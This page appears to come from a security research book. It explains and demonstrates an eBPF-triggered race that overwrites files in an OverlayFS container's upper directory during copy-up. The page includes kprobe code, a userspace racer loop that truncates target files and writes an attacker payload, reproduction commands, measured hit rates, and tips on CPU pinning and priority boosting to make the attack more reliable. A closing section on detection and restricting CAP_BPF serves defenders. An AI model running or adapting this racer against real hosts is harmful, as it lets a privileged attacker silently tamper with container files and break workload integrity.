---
layout: book
title: "The OverlayFS Trojan Horse"
date: 2025-02-01
poc_dir: dBPF-pocs/pocs/ch02-overlayfs
---

# The OverlayFS Trojan Horse

> **See also**: [Full investigation notes in the book]({{ site.baseurl }}/book/act-1/chapter-2-the-overlayfs-trojan-horse.html) · [POC source](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch02-overlayfs)

I started on this one after noticing, on a linuxkit 6.12 test VM, how much work `ovl_copy_up_one` actually does between allocating the upper inode and the merged dentry becoming visible. The interesting question was whether a userspace process with the ringbuf could win the race against the container process whose write triggered the copy-up.

The BPF side is observation: three kprobes cover the copy-up entry points (`ovl_copy_up`, `ovl_maybe_copy_up`, `ovl_copy_up_with_data`) and emit `{pid, comm, dentry name, inode, mode}` via ringbuf. The weaponization is a userspace racer that reacts to those events by opening `<upperdir>/<name>` `O_WRONLY|O_TRUNC` and writing attacker bytes before the container's next `read()` returns.

Observed timings on the test VM: the window between the first kprobe and the container read is 50–140 µs, and a `SCHED_FIFO` + CPU-pinned racer wins ~30% of the time on cold caches, higher when the container process yields.

## Mechanism

### BPF side — three kprobes, one ringbuf

```c
SEC("kprobe/ovl_maybe_copy_up")
int BPF_KPROBE(kp_mcu, struct dentry *d, int flags) {
    emit_copy_up_event(d, HOOK_MAYBE);
    return 0;
}

SEC("kprobe/ovl_copy_up")
int BPF_KPROBE(kp_cu, struct dentry *d) {
    emit_copy_up_event(d, HOOK_SYNC);
    return 0;
}

SEC("kprobe/ovl_copy_up_with_data")
int BPF_KPROBE(kp_cud, struct dentry *d) {
    emit_copy_up_event(d, HOOK_WITH_DATA);
    return 0;
}
```

`emit_copy_up_event` walks `d->d_name.name`, `d->d_inode->i_ino`, `d->d_inode->i_mode` via `BPF_CORE_READ`, stamps `bpf_get_current_pid_tgid()` and `bpf_get_current_comm()`, and pushes a ringbuf record.

### Userspace racer

```c
while (ring_buffer__poll(rb, 100) >= 0) {
    struct evt *e = ...;
    // resolve upperdir from /proc/mounts once at startup
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/%s", upperdir, e->name);
    int fd = open(path, O_WRONLY|O_TRUNC, 0);
    if (fd >= 0) {
        write(fd, PAYLOAD, sizeof(PAYLOAD));
        close(fd);
        fprintf(stderr, "[ch02] PWNED path=%s bytes=%zu hits=%d\n",
                path, sizeof(PAYLOAD), ++hits);
    }
}
```

The racer runs as a privileged peer to the container. `bpf_probe_write_user` can't reach kernel page cache, and `bpf_probe_write_kernel` does not exist — so the BPF side is purely a trigger for the userspace write.

## Hook points

- `kprobe/ovl_copy_up` — synchronous promotion path.
- `kprobe/ovl_maybe_copy_up` — pre-check before the synchronous path.
- `kprobe/ovl_copy_up_with_data` — data-carrying promotion (used when `metacopy` is off).

All three exist in `/proc/kallsyms` on 6.12 aarch64 linuxkit. On older kernels the set varies; the loader autoloads whichever are present and logs misses.

## Reproduction

```bash
cd dBPF-pocs/pocs/ch02-overlayfs
make
sudo bash trigger.sh
# ... victim writes "mutation" to merged/secret.txt, reads it back
# expected AFTER: content = "pwned-by-bpf-racer"
```

Prior art on overlayfs copy-up timing goes back to 2019 lkml discussions about lower-layer TOCTOU. The contribution here is a reproducible harness with BEFORE/AFTER markers.

## Detection

- `bpftool prog show | grep ovl_copy_up` — unusual probe targets for most fleets.
- Unexpected `open()` activity on `<upperdir>/` from a privileged peer process — look for non-container UIDs writing into overlay upperdirs.
- Mount-time option `-o redirect_dir=on` changes the upper path, which a naive racer misses. Defenders on modern kernels can also move to `-o metacopy=on` which splits data and metadata copy-up, enlarging the window defenders can monitor.

Ultimately CAP_BPF on the host gives the attacker everything above. Restrict who holds it and audit `bpf(2)` loads.

## Scope

This is a Class V primitive from chapter 20: kernel event + userspace racer. The race is real but not deterministic. For a high-confidence attack, pair with a CPU-pinning / priority-boost trick; for reliability, expect 30–70% hit rate on a loaded host.

---

**Related material**

- Full chapter: [Chapter 2 — The OverlayFS Trojan Horse]({{ site.baseurl }}/book/act-1/chapter-2-the-overlayfs-trojan-horse.html)
- POC source: [dBPF-pocs/pocs/ch02-overlayfs/](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch02-overlayfs)
- Harness entry: search for `Poc("ch02", ...)` in `dBPF-pocs/harness/proof.py`
